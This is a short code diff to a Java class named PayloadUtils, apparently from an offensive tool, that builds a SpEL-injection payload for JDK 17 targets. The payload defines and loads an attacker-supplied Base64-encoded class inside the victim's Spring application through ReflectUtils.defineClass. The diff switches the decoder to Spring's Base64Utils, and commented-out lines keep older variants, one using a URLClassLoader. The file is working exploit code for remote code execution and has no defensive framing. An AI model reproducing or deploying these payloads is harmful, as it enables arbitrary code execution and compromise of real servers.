@@ -41,7 +41,9 @@ public class PayloadUtils {
 
     public static String spelJDK17(String b64, String loaderClassName) {
         // 正常
-        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(java.util.Base64).getDecoder().decode('%s'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}", loaderClassName, b64);
+//        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(java.util.Base64).getDecoder().decode('%s'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}", loaderClassName, b64);
+        // 改进用 Spring 自带的 Base64Utils
+        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(org.springframework.util.Base64Utils).decodeFromString('%s'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}", loaderClassName, b64);
 
         // urlClassLoader
 //        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(java.util.Base64).getDecoder().decode('%s'),new java.net.URLClassLoader(new java.net.URL[0], T(java.lang.Thread).currentThread().getContextClassLoader()), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}", loaderClassName, b64);
